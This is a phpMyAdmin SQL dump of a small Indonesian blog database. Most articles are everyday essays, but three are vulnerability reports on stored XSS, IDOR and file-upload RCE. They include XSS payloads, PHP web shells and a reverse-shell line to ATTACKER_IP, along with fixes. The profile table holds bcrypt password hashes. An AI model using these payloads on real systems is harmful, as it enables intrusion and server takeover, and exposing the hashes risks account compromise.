-- phpMyAdmin SQL Dump
-- version 5.2.3
-- https://www.phpmyadmin.net/
--
-- Host: localhost:3306
-- Generation Time: Apr 02, 2026 at 10:38 AM
-- Server version: 8.0.30
-- PHP Version: 8.3.30

SET SQL_MODE = "NO_AUTO_VALUE_ON_ZERO";
START TRANSACTION;
SET time_zone = "+00:00";


/*!40101 SET @OLD_CHARACTER_SET_CLIENT=@@CHARACTER_SET_CLIENT */;
/*!40101 SET @OLD_CHARACTER_SET_RESULTS=@@CHARACTER_SET_RESULTS */;
/*!40101 SET @OLD_COLLATION_CONNECTION=@@COLLATION_CONNECTION */;
/*!40101 SET NAMES utf8mb4 */;

--
-- Database: `portarum`
--

-- --------------------------------------------------------

--
-- Table structure for table `article`
--

CREATE TABLE `article` (
  `article_id` int NOT NULL,
  `UUID` char(36) NOT NULL,
  `thumbnail` varchar(100) NOT NULL,
  `title` varchar(100) CHARACTER SET utf8mb4 COLLATE utf8mb4_0900_ai_ci NOT NULL,
  `content` longtext NOT NULL,
  `is_takedown` enum('YES','NO') NOT NULL,
  `status` enum('publish','draft') NOT NULL,
  `views` int NOT NULL,
  `likes` int NOT NULL,
  `created_at` datetime NOT NULL,
  `id_profile` int NOT NULL,
  `category_id` int NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_0900_ai_ci;

--
-- Dumping data for table `article`
--

INSERT INTO `article` (`article_id`, `UUID`, `thumbnail`, `title`, `content`, `is_takedown`, `status`, `views`, `likes`, `created_at`, `id_profile`, `category_id`) VALUES
(25, 'acc416d6-4d53-481c-a7f7-055e717af994', 'tb-020426093940.webp', 'Peran Teknologi dalam Kehidupan Sehari-hari', 'Teknologi telah menjadi bagian yang tidak terpisahkan dari kehidupan manusia modern. Hampir semua aktivitas sehari-hari kini melibatkan teknologi, baik secara langsung maupun tidak langsung. Mulai dari berkomunikasi, bekerja, hingga belajar, semuanya dapat dilakukan dengan bantuan perangkat digital.\r\n\r\nSalah satu dampak paling signifikan dari perkembangan teknologi adalah kemudahan dalam berkomunikasi. Dulu, komunikasi jarak jauh membutuhkan waktu lama melalui surat. Namun sekarang, dengan adanya aplikasi pesan instan dan media sosial, orang dapat berkomunikasi dalam hitungan detik, bahkan melalui video call.\r\n\r\nDi bidang pendidikan, teknologi juga memberikan banyak manfaat. Siswa dan mahasiswa dapat mengakses berbagai sumber belajar secara online, seperti video pembelajaran, e-book, dan kursus daring. Hal ini membuat proses belajar menjadi lebih fleksibel dan tidak terbatas oleh ruang dan waktu.\r\n\r\nSelain itu, teknologi juga membantu dalam dunia pekerjaan. Banyak perusahaan kini menggunakan sistem digital untuk mengelola data, berkomunikasi antar tim, hingga melakukan pekerjaan secara remote. Hal ini meningkatkan efisiensi dan produktivitas kerja.\r\n\r\nNamun, di balik berbagai manfaat tersebut, teknologi juga memiliki tantangan. Penggunaan yang berlebihan dapat menyebabkan ketergantungan, mengurangi interaksi sosial secara langsung, dan menimbulkan masalah kesehatan seperti mata lelah atau kurangnya aktivitas fisik.\r\n\r\nOleh karena itu, penting bagi kita untuk menggunakan teknologi secara bijak. Teknologi seharusnya menjadi alat yang membantu, bukan menggantikan peran manusia sepenuhnya.\r\n\r\nKesimpulannya, teknologi membawa banyak perubahan positif dalam kehidupan manusia. Dengan pemanfaatan yang tepat, teknologi dapat terus menjadi sarana untuk meningkatkan kualitas hidup di masa depan.', 'NO', 'publish', 4, 3, '2026-04-02 09:40:42', 15, 1),
(26, 'c4e42bb2-d61b-4257-9229-9a78bfc31649', 'tb-020426094935.jpg', 'Pentingnya Menjaga Kesehatan Tubuh', 'Kesehatan adalah aset yang paling berharga dalam kehidupan manusia. Tanpa tubuh yang sehat, seseorang akan kesulitan menjalankan aktivitas sehari-hari, baik dalam bekerja, belajar, maupun berinteraksi dengan orang lain. Oleh karena itu, menjaga kesehatan menjadi hal yang sangat penting untuk diperhatikan sejak dini.\r\n\r\nSalah satu cara utama untuk menjaga kesehatan adalah dengan mengatur pola makan. Konsumsi makanan yang bergizi seimbang, seperti sayur, buah, protein, dan karbohidrat, dapat membantu tubuh tetap bugar dan terhindar dari berbagai penyakit. Sebaliknya, mengonsumsi makanan cepat saji secara berlebihan dapat meningkatkan risiko gangguan kesehatan.\r\n\r\nSelain pola makan, olahraga juga memiliki peran penting. Aktivitas fisik secara rutin dapat meningkatkan daya tahan tubuh, memperlancar peredaran darah, serta menjaga berat badan tetap ideal. Tidak perlu olahraga yang berat, aktivitas sederhana seperti berjalan kaki atau bersepeda sudah memberikan manfaat yang besar.\r\n\r\nIstirahat yang cukup juga tidak kalah penting. Kurang tidur dapat menyebabkan tubuh mudah lelah, menurunkan konsentrasi, dan bahkan melemahkan sistem imun. Idealnya, seseorang membutuhkan waktu tidur sekitar 7–8 jam setiap malam untuk menjaga kondisi tubuh tetap optimal.\r\n\r\nSelain itu, menjaga kesehatan mental juga menjadi bagian penting dari kesehatan secara keseluruhan. Stres yang berlebihan dapat berdampak negatif pada tubuh. Oleh karena itu, penting untuk mengelola stres dengan baik, misalnya dengan melakukan hobi, meditasi, atau berbicara dengan orang terdekat.\r\n\r\nKesimpulannya, kesehatan adalah hal yang harus dijaga dengan baik melalui pola hidup yang seimbang, meliputi pola makan, olahraga, istirahat, dan kesehatan mental. Dengan tubuh yang sehat, kita dapat menjalani kehidupan dengan lebih produktif dan bahagia.', 'NO', 'publish', 3, 1, '2026-04-02 09:49:35', 15, 21),
(27, '5e182190-dce7-4b0e-a5b8-ef8547ceb38d', 'tb-020426095446.png', '🐞 Stored XSS pada Fitur Article Submission', '## 📌 Ringkasan\r\n\r\nDitemukan celah **Stored Cross-Site Scripting (XSS)** pada fitur pembuatan artikel. Input pada field *content* tidak disanitasi dengan baik sehingga memungkinkan eksekusi JavaScript berbahaya yang tersimpan di database dan dijalankan ketika artikel dibuka oleh user lain.\r\n\r\n---\r\n\r\n## 🎯 Target\r\n\r\n* Fitur: Create / Edit Article\r\n* Endpoint: `/article/create`\r\n* Parameter: `content`\r\n\r\n---\r\n\r\n## 🔍 Deskripsi Bug\r\n\r\nAplikasi mengizinkan user untuk membuat artikel dengan input HTML/Markdown, namun tidak melakukan filtering terhadap payload berbahaya seperti `<script>` atau event handler HTML.\r\n\r\nPayload yang disimpan akan dieksekusi setiap kali artikel dibuka, karena data ditampilkan langsung ke halaman tanpa encoding.\r\n\r\n---\r\n\r\n## ⚠️ Dampak\r\n\r\n* Eksekusi JavaScript di browser korban\r\n* Pencurian cookie / session user\r\n* Account takeover (jika session tidak aman)\r\n* Deface halaman\r\n* Penyebaran malware\r\n\r\n---\r\n\r\n## 🧪 Steps to Reproduce\r\n\r\n1. Login ke akun user\r\n2. Masuk ke fitur **Create Article**\r\n3. Isi form dengan payload berikut:\r\n\r\n```html\r\n<script>alert(\'XSS\')</script>\r\n```\r\n\r\n4. Submit artikel\r\n5. Buka artikel tersebut\r\n6. Payload akan dieksekusi\r\n\r\n---\r\n\r\n## 🧨 Payload Alternatif (Bypass Filter)\r\n\r\n```html\r\n<img src=x onerror=alert(document.cookie)>\r\n```\r\n\r\natau\r\n\r\n```html\r\n<svg onload=alert(1)>\r\n```\r\n\r\n---\r\n\r\n## 📷 Bukti (PoC)\r\n\r\nSaat artikel dibuka, muncul popup alert:\r\n\r\n```\r\nalert(\'XSS\')\r\n```\r\n\r\n---\r\n\r\n## 🛠️ Root Cause\r\n\r\n* Tidak adanya sanitasi input\r\n* Tidak menggunakan `htmlspecialchars()` atau equivalent\r\n* Data user ditampilkan langsung tanpa encoding\r\n* Markdown/HTML renderer tidak memiliki whitelist\r\n\r\n---\r\n\r\n## ✅ Rekomendasi Perbaikan\r\n\r\n* Gunakan output encoding:\r\n\r\n  ```php\r\n  htmlspecialchars($input, ENT_QUOTES, \'UTF-8\');\r\n  ```\r\n* Implementasi **Content Security Policy (CSP)**\r\n* Gunakan library sanitasi seperti:\r\n\r\n  * DOMPurify\r\n* Filter input HTML dengan whitelist\r\n* Escape output saat rendering artikel\r\n* Hindari `innerHTML` di frontend\r\n\r\n---\r\n\r\n## 🧾 Severity\r\n\r\n* **High / Critical** (tergantung impact)\r\n* Stored XSS memiliki dampak lebih besar karena persistent dan bisa menyerang banyak user\r\n', 'NO', 'publish', 2, 1, '2026-04-02 09:55:25', 16, 5),
(28, '7595719a-67d3-4ee1-a0af-9f25ab1cf563', 'tb-020426095634.png', '🐞 IDOR (Insecure Direct Object Reference) pada Fitur Delete Article', '## 📌 Ringkasan\r\n\r\nDitemukan celah **IDOR / Broken Access Control** pada fitur hapus artikel, dimana user dapat menghapus artikel milik user lain hanya dengan mengubah parameter `article_id`.\r\n\r\n---\r\n\r\n## 🎯 Target\r\n\r\n* Fitur: Delete Article\r\n* Endpoint: `/article/delete.php?id=ARTICLE_ID`\r\n* Parameter: `id`\r\n\r\n---\r\n\r\n## 🔍 Deskripsi Bug\r\n\r\nAplikasi hanya memeriksa keberadaan `article_id` tanpa memvalidasi apakah artikel tersebut dimiliki oleh user yang sedang login.\r\n\r\nAkibatnya, user bisa menghapus artikel user lain dengan menebak atau mendapatkan ID artikel.\r\n\r\n---\r\n\r\n## ⚠️ Dampak\r\n\r\n* Penghapusan data tanpa izin\r\n* Kehilangan data user lain\r\n* Potensi kerusakan reputasi\r\n* Abuse sistem (misalnya mass delete)\r\n\r\n---\r\n\r\n## 🧪 Steps to Reproduce\r\n\r\n1. Login sebagai User A\r\n2. Buat artikel baru (ID: 101)\r\n3. Logout\r\n4. Login sebagai User B\r\n5. Ubah request delete:\r\n\r\n```http id=\"q2k8m1\"\r\nGET /article/delete.php?id=101\r\n```\r\n\r\n6. Artikel milik User A berhasil terhapus\r\n\r\n---\r\n\r\n## 🧨 Payload / Request\r\n\r\n```http id=\"l9v2xk\"\r\nGET /article/delete.php?id=101\r\nCookie: session=USER_B_SESSION\r\n```\r\n\r\n---\r\n\r\n## 🔎 Evidence\r\n\r\n* Artikel berhasil dihapus tanpa validasi ownership\r\n* Tidak ada pengecekan `id_user` di backend query\r\n\r\n---\r\n\r\n## 🛠️ Root Cause\r\n\r\n* Tidak adanya validasi ownership pada backend\r\n* Query langsung berdasarkan `article_id`\r\n* Tidak ada authorization check\r\n\r\nContoh query yang rentan:\r\n\r\n```sql\r\nDELETE FROM article WHERE id = ?\r\n```\r\n\r\n---\r\n\r\n## ✅ Rekomendasi Perbaikan\r\n\r\n* Tambahkan validasi user:\r\n\r\n```php\r\nDELETE FROM article \r\nWHERE id = ? AND user_id = ?\r\n```\r\n\r\n* Gunakan middleware / authorization check\r\n* Jangan percaya input dari client\r\n* Implementasi access control pada setiap action sensitif\r\n\r\n---\r\n\r\n## 🧾 Severity\r\n\r\n* **High**\r\n* Berdampak pada integrity data dan keamanan sistem', 'NO', 'publish', 2, 0, '2026-04-02 09:56:34', 16, 5),
(29, '42f26575-47fe-477f-a090-c928e556d158', 'tb-020426095817.jpg', '🐞 Remote Code Execution (RCE) pada Fitur Article Upload', '## 📌 Ringkasan\r\n\r\nDitemukan celah **Remote Code Execution (RCE)** pada fitur upload gambar artikel. Server tidak memvalidasi dengan benar file yang diupload, sehingga memungkinkan eksekusi kode berbahaya di server.\r\n\r\n---\r\n\r\n## 🎯 Target\r\n\r\n* Fitur: Upload Gambar Artikel\r\n* Endpoint: `/article/upload.php`\r\n* Parameter: `file`\r\n\r\n---\r\n\r\n## 🔍 Deskripsi Bug\r\n\r\nAplikasi hanya memeriksa ekstensi file secara client-side atau tidak melakukan validasi yang kuat di server.\r\n\r\nPenyerang dapat mengunggah file berisi kode PHP dan mengeksekusinya dengan mengakses file tersebut melalui browser.\r\n\r\n---\r\n\r\n## ⚠️ Dampak\r\n\r\n* Eksekusi perintah di server\r\n* Akses penuh ke sistem (web shell)\r\n* Dump database\r\n* Remote control server\r\n* Potensi full system compromise\r\n\r\n---\r\n\r\n## 🧪 Steps to Reproduce\r\n\r\n1. Siapkan file web shell:\r\n\r\n```php id=\"x8k3p1\"\r\n<?php system($_GET[\'cmd\']); ?>\r\n```\r\n\r\n2. Rename file menjadi:\r\n\r\n```\r\nshell.jpg.php\r\n```\r\n\r\n3. Upload file melalui fitur upload artikel\r\n4. Akses file yang diupload:\r\n\r\n```\r\nhttps://target.com/uploads/shell.jpg.php?cmd=id\r\n```\r\n\r\n5. Command akan dieksekusi di server\r\n\r\n---\r\n\r\n## 🧨 Payload\r\n\r\n### Web Shell Basic\r\n\r\n```php id=\"r3k9lm\"\r\n<?php echo shell_exec($_GET[\'cmd\']); ?>\r\n```\r\n\r\n### Reverse Shell (contoh)\r\n\r\n```php id=\"p8v2sn\"\r\n<?php system(\"bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1\"); ?>\r\n```\r\n\r\n---\r\n\r\n## 🔎 Evidence\r\n\r\n* File berhasil diupload dengan ekstensi PHP\r\n* File dapat diakses langsung dari web\r\n* Command berhasil dijalankan di server\r\n\r\n---\r\n\r\n## 🛠️ Root Cause\r\n\r\n* Tidak ada validasi MIME type yang benar\r\n* Tidak membatasi ekstensi file\r\n* File disimpan di direktori yang dapat diakses publik\r\n* Tidak melakukan rename file secara aman\r\n* Tidak ada scanning terhadap isi file\r\n\r\n---\r\n\r\n## ✅ Rekomendasi Perbaikan\r\n\r\n* Validasi file secara ketat:\r\n\r\n  * Ekstensi (whitelist)\r\n  * MIME type\r\n* Rename file upload (random / hash)\r\n* Simpan file di luar web root\r\n* Nonaktifkan eksekusi script di folder upload\r\n* Gunakan antivirus / malware scanner\r\n* Tambahkan check isi file (magic bytes)\r\n\r\nContoh konfigurasi `.htaccess`:\r\n\r\n```apache id=\"d7k2qv\"\r\nphp_flag engine off\r\nRemoveHandler .php .phtml .php3 .php4 .php5 .php7 .php8\r\n```\r\n\r\n---\r\n\r\n## 🧾 Severity\r\n\r\n* **Critical**\r\n* Dampak langsung ke server (RCE = full compromise)\r\n\r\n', 'NO', 'publish', 3, 3, '2026-04-02 09:58:17', 16, 5),
(30, '550b7932-c608-4e3f-9550-e074913f4f66', 'tb-020426100227.jpg', 'Kehidupan Kucing dan Perawatannya', 'Kucing adalah salah satu hewan peliharaan yang paling populer di dunia. Hewan ini dikenal karena sifatnya yang lucu, lincah, dan kadang mandiri. Banyak orang memilih kucing sebagai hewan peliharaan karena perawatannya yang relatif mudah dibandingkan hewan lainnya.\r\n\r\nKucing memiliki kemampuan berburu yang sangat baik. Meskipun sudah dipelihara, insting alaminya untuk mengejar dan menangkap mangsa tetap ada. Hal ini membuat kucing sering terlihat bermain dengan benda-benda kecil seperti bola atau mainan lainnya.\r\n\r\nDalam hal perawatan, kucing membutuhkan makanan yang bergizi agar tetap sehat. Pemilik kucing harus memberikan makanan khusus yang mengandung nutrisi lengkap, seperti protein, vitamin, dan mineral. Selain itu, air bersih juga harus selalu tersedia.\r\n\r\nKebersihan kucing juga perlu diperhatikan. Kucing biasanya membersihkan tubuhnya sendiri dengan menjilati bulunya, namun tetap perlu dimandikan secara berkala untuk menjaga kebersihan dan kesehatan kulitnya. Selain itu, perawatan seperti memotong kuku dan membersihkan telinga juga penting dilakukan.\r\n\r\nKucing juga membutuhkan lingkungan yang nyaman dan aman. Tempat tidur yang hangat serta ruang bermain dapat membantu kucing merasa lebih tenang dan bahagia. Interaksi dengan pemiliknya juga penting agar kucing tidak merasa kesepian.\r\n\r\nKesimpulannya, kucing adalah hewan peliharaan yang menyenangkan dan mudah dirawat jika diberikan perhatian yang cukup. Dengan perawatan yang baik, kucing dapat hidup sehat dan menjadi teman yang setia bagi manusia.', 'NO', 'publish', 0, 0, '2026-04-02 10:02:51', 17, 22),
(31, '0188b40f-6919-452c-9cc7-f34a7df32ff3', 'tb-020426100350.jpg', 'Kucing: Hewan Peliharaan yang Cerdas dan Menggemaskan', 'Kucing merupakan salah satu hewan peliharaan yang paling banyak dipelihara di berbagai negara. Hewan ini dikenal karena tingkah lakunya yang menggemaskan serta kemampuannya untuk beradaptasi dengan lingkungan manusia. Kucing juga memiliki berbagai ras dengan ciri khas masing-masing.\r\n\r\nSecara fisik, kucing memiliki tubuh yang lentur, cakar tajam, serta penglihatan yang sangat baik, terutama pada malam hari. Kemampuan ini membuat kucing menjadi pemburu yang handal, meskipun hidup sebagai hewan peliharaan. Insting berburu ini biasanya terlihat saat kucing bermain dengan benda-benda kecil.\r\n\r\nKucing juga dikenal sebagai hewan yang cukup mandiri. Mereka dapat menjaga kebersihan tubuhnya sendiri dengan menjilati bulu secara rutin. Namun, pemilik tetap perlu memberikan perawatan tambahan seperti menyisir bulu, memandikan, serta menjaga kebersihan kandang atau lingkungan tempat kucing tinggal.\r\n\r\nDalam hal kesehatan, kucing membutuhkan vaksinasi dan pemeriksaan rutin ke dokter hewan. Hal ini penting untuk mencegah berbagai penyakit yang dapat menyerang kucing. Selain itu, pemberian makanan yang seimbang juga sangat berpengaruh terhadap kesehatan dan pertumbuhan kucing.\r\n\r\nInteraksi dengan kucing juga dapat memberikan manfaat bagi manusia. Memelihara kucing dapat membantu mengurangi stres, meningkatkan suasana hati, dan memberikan rasa nyaman. Tidak heran jika banyak orang merasa lebih bahagia ketika memiliki hewan peliharaan ini.\r\n\r\nKesimpulannya, kucing adalah hewan peliharaan yang menarik, cerdas, dan mudah dirawat jika diberikan perhatian yang cukup. Dengan perawatan yang baik, kucing dapat menjadi teman yang setia dan menyenangkan dalam kehidupan sehari-hari.', 'YES', 'draft', 2, 0, '2026-04-02 10:03:50', 17, 22),
(32, '057701a3-a60e-4f38-a37b-4ce759628e1e', 'tb-020426100427.jpg', 'Perilaku Unik Kucing yang Menarik untuk Diketahui', 'Kucing adalah hewan yang memiliki banyak perilaku unik yang sering membuat pemiliknya merasa penasaran. Salah satu kebiasaan yang paling umum adalah kucing suka tidur dalam waktu yang lama. Kucing bisa tidur hingga 12–16 jam per hari untuk menghemat energi.\r\n\r\nSelain itu, kucing memiliki kebiasaan menjilati tubuhnya. Perilaku ini tidak hanya untuk membersihkan diri, tetapi juga untuk menjaga suhu tubuh dan meratakan minyak alami pada bulunya. Inilah alasan mengapa kucing sering terlihat sangat bersih dibandingkan hewan lain.\r\n\r\nKucing juga dikenal sebagai hewan yang sangat sensitif terhadap suara dan gerakan. Mereka memiliki pendengaran yang tajam dan mampu mendeteksi suara dengan frekuensi tinggi yang tidak bisa didengar oleh manusia. Hal ini membantu kucing dalam berburu dan menghindari bahaya.\r\n\r\nPerilaku lain yang menarik adalah kucing suka menggosokkan tubuhnya ke manusia atau benda. Tindakan ini sebenarnya adalah cara kucing menandai wilayahnya dengan aroma tubuhnya, sekaligus menunjukkan rasa percaya dan kenyamanan terhadap lingkungan atau orang tersebut.\r\n\r\nSelain itu, kucing juga sering menunjukkan perilaku bermain, terutama saat masih muda. Bermain membantu kucing mengasah kemampuan berburu dan menjaga kebugaran tubuhnya. Mainan sederhana seperti bola atau tali sering menjadi favorit mereka.\r\n\r\nKesimpulannya, kucing memiliki berbagai perilaku unik yang mencerminkan insting alami mereka. Memahami perilaku ini dapat membantu pemilik memberikan perawatan yang lebih baik dan menjalin hubungan yang lebih dekat dengan kucing peliharaannya.', 'NO', 'publish', 0, 0, '2026-04-02 10:04:27', 17, 22),
(33, 'eea4d0fa-7185-4959-ba83-bafed353d87b', 'tb-020426101328.jpg', 'Dasar-Dasar Investasi Saham untuk Pemula', 'Investasi saham merupakan salah satu cara untuk mengembangkan aset dalam jangka panjang. Saham sendiri adalah bukti kepemilikan seseorang terhadap suatu perusahaan. Dengan memiliki saham, investor berhak atas sebagian keuntungan perusahaan dalam bentuk dividen serta potensi kenaikan harga saham (capital gain).\r\n\r\nBanyak orang tertarik pada investasi saham karena potensi keuntungannya yang relatif tinggi dibandingkan instrumen lain seperti deposito atau obligasi. Namun, di balik potensi keuntungan tersebut, terdapat juga risiko yang harus diperhatikan, seperti fluktuasi harga yang bisa naik dan turun secara drastis dalam waktu singkat.\r\n\r\nSebelum mulai berinvestasi, penting untuk memahami beberapa istilah dasar dalam dunia saham, seperti:\r\n\r\n* **Bullish**: kondisi pasar yang sedang naik.\r\n* **Bearish**: kondisi pasar yang sedang turun.\r\n* **Dividen**: pembagian keuntungan perusahaan kepada pemegang saham.\r\n* **Capital Gain**: keuntungan dari selisih harga beli dan harga jual saham.\r\n\r\nSelain itu, investor juga perlu melakukan analisis sebelum membeli saham. Terdapat dua jenis analisis utama:\r\n\r\n1. **Analisis Fundamental** – melihat kinerja keuangan perusahaan, laporan keuangan, dan prospek bisnis.\r\n2. **Analisis Teknikal** – melihat pergerakan harga dan pola grafik untuk memprediksi arah pasar.\r\n\r\nStrategi investasi juga menjadi kunci penting dalam saham. Beberapa strategi yang umum digunakan antara lain:\r\n\r\n* **Long-term investing**: membeli saham dan menyimpannya dalam jangka panjang.\r\n* **Trading**: membeli dan menjual saham dalam jangka pendek untuk mendapatkan keuntungan cepat.\r\n* **Value investing**: mencari saham yang undervalued atau harganya di bawah nilai sebenarnya.\r\n\r\nSebagai pemula, sebaiknya mulai dengan modal kecil dan fokus pada belajar memahami pasar terlebih dahulu. Hindari mengambil keputusan berdasarkan emosi, dan selalu lakukan riset sebelum membeli saham.\r\n\r\nInvestasi saham bukanlah cara cepat untuk menjadi kaya, tetapi merupakan proses jangka panjang yang membutuhkan kesabaran, disiplin, dan pengetahuan yang cukup.', 'NO', 'publish', 1, 0, '2026-04-02 10:14:52', 18, 23),
(34, '723b7803-2661-41b2-8db2-4fee2fbe1e06', 'tb-020426101547.webp', 'Strategi Diversifikasi dalam Investasi Saham', 'Diversifikasi adalah strategi penting dalam investasi saham yang bertujuan untuk mengurangi risiko. Dengan menyebarkan investasi ke beberapa saham atau sektor, kerugian dari satu aset dapat diimbangi oleh keuntungan dari aset lainnya.\r\n\r\nBanyak investor pemula sering melakukan kesalahan dengan hanya berinvestasi pada satu saham. Padahal, jika saham tersebut mengalami penurunan, seluruh portofolio akan ikut terdampak. Oleh karena itu, diversifikasi menjadi langkah yang bijak untuk menjaga stabilitas investasi.\r\n\r\nDiversifikasi dapat dilakukan dengan beberapa cara, seperti:\r\n\r\n* Membagi investasi ke berbagai sektor (perbankan, teknologi, konsumsi, dll)\r\n* Mengombinasikan saham berkapitalisasi besar dan kecil\r\n* Menyebarkan investasi ke beberapa negara atau indeks saham\r\n\r\nSelain diversifikasi, penting juga untuk memahami profil risiko masing-masing investor. Ada yang lebih nyaman dengan risiko rendah (low risk), sedang (moderate), hingga tinggi (high risk). Semakin tinggi risiko yang diambil, biasanya potensi keuntungannya juga semakin besar.\r\n\r\nInvestor juga sebaiknya tidak hanya fokus pada harga saham, tetapi juga memperhatikan faktor lain seperti:\r\n\r\n* Kinerja keuangan perusahaan\r\n* Tren industri\r\n* Kondisi ekonomi global\r\n* Kebijakan pemerintah dan suku bunga\r\n\r\nDalam praktiknya, diversifikasi bukan berarti menghilangkan risiko sepenuhnya, tetapi membantu mengelola risiko agar tidak terlalu besar. Dengan strategi yang tepat, investor dapat menjaga kestabilan portofolio dan meningkatkan peluang keuntungan jangka panjang.\r\n\r\nKunci utama dalam investasi saham tetaplah konsistensi, disiplin, dan kesabaran dalam menghadapi fluktuasi pasar.\r\n', 'NO', 'publish', 0, 0, '2026-04-02 10:15:47', 18, 23);

-- --------------------------------------------------------

--
-- Table structure for table `article_like`
--

CREATE TABLE `article_like` (
  `id_article_like` int NOT NULL,
  `article_id` int NOT NULL,
  `id_profile` int NOT NULL,
  `created_at` datetime NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_0900_ai_ci;

--
-- Dumping data for table `article_like`
--

INSERT INTO `article_like` (`id_article_like`, `article_id`, `id_profile`, `created_at`) VALUES
(28, 25, 15, '2026-04-02 17:40:50'),
(31, 27, 16, '2026-04-02 17:55:18'),
(32, 29, 16, '2026-04-02 17:58:25'),
(33, 25, 17, '2026-04-02 18:09:44'),
(34, 26, 18, '2026-04-02 18:16:05'),
(35, 29, 18, '2026-04-02 18:22:01'),
(36, 25, 13, '2026-04-02 18:24:42'),
(37, 29, 13, '2026-04-02 18:24:46');

-- --------------------------------------------------------

--
-- Table structure for table `article_view`
--

CREATE TABLE `article_view` (
  `id_article_view` int NOT NULL,
  `article_id` int NOT NULL,
  `id_profile` int NOT NULL,
  `viewed_at` datetime NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_0900_ai_ci;

--
-- Dumping data for table `article_view`
--

INSERT INTO `article_view` (`id_article_view`, `article_id`, `id_profile`, `viewed_at`) VALUES
(377, 25, 15, '2026-04-02 17:40:49'),
(378, 26, 13, '2026-04-02 17:50:00'),
(379, 27, 13, '2026-04-02 17:55:06'),
(380, 27, 16, '2026-04-02 17:55:15'),
(382, 29, 16, '2026-04-02 17:57:37'),
(383, 28, 16, '2026-04-02 17:57:42'),
(384, 25, 16, '2026-04-02 17:57:44'),
(389, 26, 16, '2026-04-02 17:58:51'),
(399, 25, 17, '2026-04-02 18:09:43'),
(400, 33, 18, '2026-04-02 18:13:38'),
(401, 26, 18, '2026-04-02 18:16:04'),
(402, 28, 18, '2026-04-02 18:21:56'),
(403, 29, 18, '2026-04-02 18:22:00'),
(406, 25, 13, '2026-04-02 18:24:41'),
(407, 29, 13, '2026-04-02 18:24:45'),
(409, 31, 13, '2026-04-02 18:25:06'),
(421, 31, 17, '2026-04-02 18:36:05');

-- --------------------------------------------------------

--
-- Table structure for table `category`
--

CREATE TABLE `category` (
  `category_id` int NOT NULL,
  `nama` varchar(50) NOT NULL,
  `created_at` datetime NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_0900_ai_ci;

--
-- Dumping data for table `category`
--

INSERT INTO `category` (`category_id`, `nama`, `created_at`) VALUES
(1, 'Teknologi', '2026-03-31 01:12:46'),
(2, 'Programming', '2026-03-31 01:12:46'),
(3, 'Web Development', '2026-03-31 01:12:46'),
(4, 'Mobile Development', '2026-03-31 01:12:46'),
(5, 'Cyber Security', '2026-04-02 09:55:01'),
(6, 'AI & Machine Learning', '2026-03-31 01:12:46'),
(7, 'Data Science', '2026-03-31 01:12:46'),
(8, 'Desain Grafis', '2026-03-31 01:12:46'),
(9, 'UI/UX', '2026-03-31 01:12:46'),
(10, 'Berita', '2026-03-31 01:12:46'),
(11, 'Tutorial', '2026-03-31 01:12:46'),
(12, 'Bisnis', '2026-03-31 01:12:46'),
(13, 'Marketing', '2026-03-31 01:12:46'),
(14, 'Lifestyle', '2026-03-31 01:12:46'),
(15, 'Gaming', '2026-03-31 01:12:46'),
(21, 'Kesehatan', '2026-04-02 09:49:06'),
(22, 'Hewan', '2026-04-02 10:02:41'),
(23, 'Investasi', '2026-04-02 10:13:24');

-- --------------------------------------------------------

--
-- Table structure for table `profile`
--

CREATE TABLE `profile` (
  `id_profile` int NOT NULL,
  `UUID` char(36) NOT NULL,
  `username` varchar(20) NOT NULL,
  `password` text NOT NULL,
  `nama` varchar(70) CHARACTER SET utf8mb4 COLLATE utf8mb4_0900_ai_ci NOT NULL,
  `bio` varchar(200) DEFAULT NULL,
  `is_admin` enum('NO','YES') NOT NULL,
  `photo` varchar(50) NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_0900_ai_ci;

--
-- Dumping data for table `profile`
--

INSERT INTO `profile` (`id_profile`, `UUID`, `username`, `password`, `nama`, `bio`, `is_admin`, `photo`) VALUES
(13, '5b09e247-59fa-4047-8a2d-e1580256d05a', 'admin', '$2y$10$Ot8hDkmYSFK3a58A8LWCcOV1mMjueL41cFiKc9TEKd7EZmhElC.wK', 'admin', 'tak hitamkan kamu', 'YES', 'default.jpg'),
(15, '85d9ceb7-ac90-4fc2-b847-24277f8c7b0a', 'andi', '$2y$10$d.szQ8BAWyyykLsz9ZQa/.gzO722qboJJhlAkxtIvDsw3hJ7Gmj5m', 'andi', 'aku andi, kamu siapa? ', 'NO', 'pf-020426093539.jpg'),
(16, '2e6e5fb0-6318-4693-a999-e34763b8a5cc', 'abdul', '$2y$10$zycVi3L6kOJkk45z1GY4oOpZcARROVeDW3yLjrx0BypRRCEn8Sxrm', 'abdul', 'aku hacker', 'NO', 'pf-020426095209.jpg'),
(17, '348b4fd4-d664-482d-9f90-8f140e9cc800', 'sumbul', '$2y$10$UgxqG/Ojp5s6ookhGxK0teQEFPiex142BZECzq4b5Y0bFJ5FzQ2iO', 'Sumbul', 'bakekok\r\n', 'NO', 'pf-020426100127.jpg'),
(18, '88b11c70-88d7-43ca-8ea9-3eefa4b16999', 'wahyu', '$2y$10$kDMzFyJAw3f/USC/waVy/.CJthzhIPBBRyXg4hBr1LjTVCUkO5xC6', 'wahyu', 'all in dek, cacing cacing naga naga, otw dealer mekleren\r\n', 'NO', 'pf-020426101200.jpg');

--
-- Indexes for dumped tables
--

--
-- Indexes for table `article`
--
ALTER TABLE `article`
  ADD PRIMARY KEY (`article_id`),
  ADD UNIQUE KEY `UUID` (`UUID`),
  ADD KEY `fk_id_profile` (`id_profile`),
  ADD KEY `fk_category_id` (`category_id`);

--
-- Indexes for table `article_like`
--
ALTER TABLE `article_like`
  ADD PRIMARY KEY (`id_article_like`),
  ADD UNIQUE KEY `article_id` (`article_id`,`id_profile`),
  ADD KEY `id_profile` (`id_profile`) USING BTREE;

--
-- Indexes for table `article_view`
--
ALTER TABLE `article_view`
  ADD PRIMARY KEY (`id_article_view`),
  ADD UNIQUE KEY `article_id_2` (`article_id`,`id_profile`),
  ADD KEY `id_profile` (`id_profile`) USING BTREE;

--
-- Indexes for table `category`
--
ALTER TABLE `category`
  ADD PRIMARY KEY (`category_id`);

--
-- Indexes for table `profile`
--
ALTER TABLE `profile`
